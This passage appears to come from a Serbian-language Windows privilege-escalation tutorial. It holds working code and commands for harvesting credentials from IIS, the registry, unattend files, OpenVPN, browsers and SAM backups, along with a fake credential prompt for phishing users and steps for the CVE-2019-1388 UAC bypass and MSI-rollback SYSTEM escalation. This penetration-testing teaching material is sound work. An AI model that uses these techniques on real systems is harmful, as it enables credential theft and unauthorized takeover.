**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga sa High Integrity nivoom.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su neki **credentials** konfigurisani i da se mogu **oporaviti**.

Ovaj kod je preuzet iz projekta [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalacioni programi se **pokreću sa SYSTEM privilegijama**, a mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Datoteke i Registry (Kredencijali)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani unutar ključa registra `HKCU\Software\OpenSSH\Agent\Keys`, pa treba proveriti da li se tamo nalazi nešto zanimljivo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji unos unutar te putanje, verovatno je u pitanju sačuvani SSH ključ. Čuva se šifrovan, ali se lako može dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici možete pronaći ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokreće pri podizanju sistema, pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram SSH ključeve, dodam ih pomoću `ssh-add` i prijavim se putem SSH-a na mašinu. Registry ključ HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije identifikovao upotrebu `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za unattended instalaciju
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ove fajlove možete potražiti i koristeći **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM i SYSTEM backup-ovi
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud kredencijali
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširani GPP Pasword

Ranije je postojala funkcija koja je omogućavala deployment prilagođenih lokalnih administrator naloga na grupi računara putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne bezbednosne propuste. Prvo, Group Policy Objects (GPO), sačuvani kao XML datoteke u SYSVOL-u, mogli su biti dostupni svakom korisniku domena. Drugo, lozinke unutar ovih GPP-ova, šifrovane pomoću AES256 algoritma i javno dokumentovanog podrazumevanog ključa, mogao je dešifrovati svaki autentifikovani korisnik. Ovo je predstavljalo ozbiljan rizik, jer je korisnicima moglo omogućiti dobijanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija za pretragu lokalno keširanih GPP datoteka koje sadrže polje `"cpassword"` koje nije prazno. Nakon pronalaženja takve datoteke, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što olakšava identifikaciju i otklanjanje ove bezbednosne ranjivosti.

Pretražite `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_ sledeće datoteke:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dešifrovanje cPassword-a:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec za dobijanje lozinki:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer web.config datoteke sa akreditivima:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN akreditivi
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logovi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Traži akreditive

Uvek možeš **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako misliš da ih možda zna (imaj na umu da je direktno **traženje** **akreditiva** od klijenta veoma **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mogući nazivi datoteka koje sadrže akreditive**

Poznate datoteke koje su ranije sadržale **lozinke** u **čistom tekstu** ili formatu **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Pretražite sve predložene fajlove:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Kredencijali u RecycleBin-u

Takođe bi trebalo da proverite Korpu kako biste u njoj pronašli kredencijale

Da biste **oporavili lozinke** sačuvane u nekoliko programa, možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući ključevi registra sa kredencijalima**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Izvucite openssh ključeve iz registry-ja.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija browsera

Trebalo bi da proverite dbs u kojima su sačuvane lozinke iz **Chrome-a ili Firefox-a**.\
Takođe proverite istoriju, bookmarks i omiljene stranice browsera, jer su možda neke **lozinke** tamo sačuvane.

Alatke za izvlačenje lozinki iz browsera:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Prepisivanje COM DLL-ova**

**Component Object Model (COM)** je tehnologija ugrađena u Windows operativni sistem koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta je **identifikovana pomoću class ID-ja (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih pomoću interface ID-jeva (IID-jeva).

COM klase i interfejsi su definisani u registry-ju pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ovaj registry se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-jeva ovog registry-ja možete pronaći child registry **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja pokazuje na **DLL**, kao i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ili Multi) ili **Neutral** (Thread Neutral).

![Istorija browsera - Prepisivanje COM DLL-ova: Unutar CLSID-jeva ovog registry-ja možete pronaći child registry InProcServer32, koji sadrži podrazumevanu vrednost koja pokazuje na DLL i vrednost...](<../../images/image (729).png>)

U osnovi, ako možete **prepisati bilo koji DLL** koji će biti izvršen, mogli biste da **eskalirate privilegije** ako će taj DLL biti izvršen od strane drugog korisnika.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam persistence-a, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registry-ju**

**Pretražite sadržaj datoteka**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Pretraživanje datoteke sa određenim nazivom**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretražite registry za nazive ključeva i lozinke**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji pretražuju lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin koji sam kreirao da **automatski izvrši svaki metasploit POST module koji pretražuje credentials** unutar žrtve.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) pretražuje **sessions**, **usernames** i **passwords** nekoliko alata koji čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) **sa punim pristupom**. Isti proces takođe **kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali koji nasleđuje sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete preuzeti **otvoreni handle ka privilegovanom procesu kreiranom** pomoću `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte ovaj **drugi post za potpunije objašnjenje kako testirati i zloupotrebiti više otvorenih handle-ova procesa i thread-ova nasleđenih sa različitim nivoima dozvola (ne samo sa punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, koji se nazivaju **pipe-ovi**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **client** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** **client-a**, pod uslovom da ima potrebna prava **SeImpersonate**. Pronalaženje **privilegovanog procesa** koji komunicira preko pipe-a koji možete imitirati pruža mogućnost za **dobijanje viših privilegija** preuzimanjem identiteta tog procesa kada on stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvršavanje takvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava **presretanje komunikacije named pipe-a pomoću alata kao što je burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u server režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani client može zloupotrebiti async event putanju zasnovanu na mailslot-u da pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobije Telephony admin prava i učita proizvoljan DLL kao servis. Kompletan tok:

- `ClientAttach` sa `pszDomainUser` podešenim na postojeću putanju u koju je moguće upisivati → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za async event upise.
- Svaki event upisuje napadačev `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite ga pomoću `GetAsyncEvents` (`Req_Func 0)`), a zatim izvršite unregister/shutdown da biste ponavljali determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa proizvoljnom putanjom DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu izvršavati sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a putem Markdown renderera

Markdown linkovi na koje je moguće kliknuti, a koji se prosleđuju funkciji `ShellExecuteExW`, mogu pokrenuti opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvršiti datoteke pod kontrolom napadača kao trenutni user. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi lozinki**

Kada dobijete shell kao user, mogu postojati scheduled tasks ili drugi procesi koji se izvršavaju i **prosleđuju kredencijale kroz komandnu liniju**. Skripta ispod beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim stanjem, prikazujući sve razlike.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Krađa lozinki iz procesa

## Od Low Priv User do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces, kao što je "NT\AUTHORITY SYSTEM", sa naloga unprivileged user-a.

Ovo omogućava eskalaciju privilegija i istovremeni zaobilazak UAC-a korišćenjem iste ranjivosti. Pored toga, nije potrebno ništa instalirati, a binary koji se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Imate sve neophodne fajlove i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od srednjeg do visokog nivoa integriteta za Administratora / UAC Bypass

Pročitajte ovo da biste **naučili više o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili više o UAC-u i UAC bypass tehnikama:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Od brisanja/pomeranja/preimenovanja proizvoljnog foldera do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe rollback funkcije Windows Installer-a radi zamene legitimnih fajlova zlonamernim fajlovima tokom procesa deinstalacije. Za ovo napadač mora da kreira **zlonamerni MSI installer** koji će biti korišćen za hijacking foldera `C:\Config.Msi`, koji će Windows Installer kasnije koristiti za čuvanje rollback fajlova tokom deinstalacije drugih MSI paketa, pri čemu bi rollback fajlovi bili izmenjeni tako da sadrže zlonamerni payload.

Sažeta tehnika je sledeća:

1. **Faza 1 – Priprema hijack-a (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
- Kreirajte `.msi` koji instalira bezopasan fajl (npr. `dummy.txt`) u folder u koji je moguće upisivati (`TARGETDIR`).
- Označite installer kao **"UAC Compliant"**, tako da ga **non-admin korisnik** može pokrenuti.
- Ostavite **handle** otvoren prema fajlu nakon instalacije.

- Korak 2: Započnite deinstalaciju
- Deinstalirajte isti `.msi`.
- Proces deinstalacije počinje da premešta fajlove u `C:\Config.Msi` i da ih preimenuje u `.rbf` fajlove (rollback backup fajlove).
- **Poll-ujte otvoreni handle fajla** pomoću `GetFinalPathNameByHandle` da biste detektovali kada fajl postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Custom Syncing
- `.msi` sadrži **custom uninstall action (`SyncOnRbfWritten`)** koja:
- Signalizira kada je `.rbf` upisan.
- Zatim čeka na drugi event pre nego što nastavi deinstalaciju.

- Korak 4: Blokirajte brisanje `.rbf` fajla
- Kada dobijete signal, **otvorite `.rbf` fajl** bez `FILE_SHARE_DELETE` — to **sprečava njegovo brisanje**.
- Zatim pošaljite signal nazad kako bi deinstalacija mogla da se završi.
- Windows Installer ne uspeva da obriše `.rbf`, a pošto ne može da obriše sav sadržaj, `C:\Config.Msi` se ne uklanja.

- Korak 5: Ručno obrišite `.rbf`
- Vi (napadač) ručno obrišite `.rbf` fajl.
- Sada je **`C:\Config.Msi` prazan**, spreman za hijacking.

> U ovom trenutku **aktivirajte vulnerability za brisanje proizvoljnog foldera na SYSTEM nivou** kako biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
- Sami ponovo kreirajte folder `C:\Config.Msi`.
- Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa `WRITE_DAC`.

- Korak 7: Pokrenite drugu instalaciju
- Ponovo instalirajte `.msi`, sa:
- `TARGETDIR`: Lokacija u koju je moguće upisivati.
- `ERROROUT`: Promenljiva koja aktivira prisilni neuspeh.
- Ova instalacija će se koristiti za ponovno aktiviranje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Nadgledajte `.rbs`
- Koristite `ReadDirectoryChangesW` za nadgledanje foldera `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
- Sačuvajte njegovo ime fajla.

- Korak 9: Sync pre rollback-a
- `.msi` sadrži **custom install action (`SyncBeforeRollback`)** koja:
- Signalizira event kada se `.rbs` kreira.
- Zatim čeka pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
- Nakon prijema event-a `.rbs created`:
- Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
- Ali pošto i dalje imate handle sa `WRITE_DAC`, možete ponovo primeniti **slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u folder.

- Korak 11: Ubacite lažne `.rbs` i `.rbf`
- Prepišite `.rbs` fajl **lažnom rollback skriptom** koja govori Windows-u da:
- Vrati vaš `.rbf` fajl (zlonamerni DLL) u **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Ubacite vaš lažni `.rbf` koji sadrži **zlonamerni DLL payload na SYSTEM nivou**.

- Korak 12: Aktivirajte rollback
- Signalizirajte sync event kako bi installer nastavio sa radom.
- **Type 19 custom action (`ErrorOut`)** je podešen tako da **namerno izazove neuspeh instalacije** u poznatoj tački.
- Ovo prouzrokuje početak rollback-a.

- Korak 13: SYSTEM instalira vaš DLL
- Windows Installer:
- Čita vaš zlonamerni `.rbs`.
- Kopira `.rbf` DLL na ciljnu lokaciju.
- Sada imate **zlonamerni DLL u putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
- Pokrenite pouzdani **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste hijack-ovali.
- **Boom**: Vaš kod se izvršava **kao SYSTEM**.


### Od brisanja/pomeranja/preimenovanja proizvoljnog fajla do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete obrisati **ceo folder** (npr. `C:\Config.Msi`). Ali šta ako vaša vulnerability omogućava samo **brisanje proizvoljnih fajlova**?

Možete iskoristiti **NTFS internals**: svaki folder ima skriveni alternate data stream pod nazivom:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ovaj stream skladišti **metapodatke indeksa** fascikle.

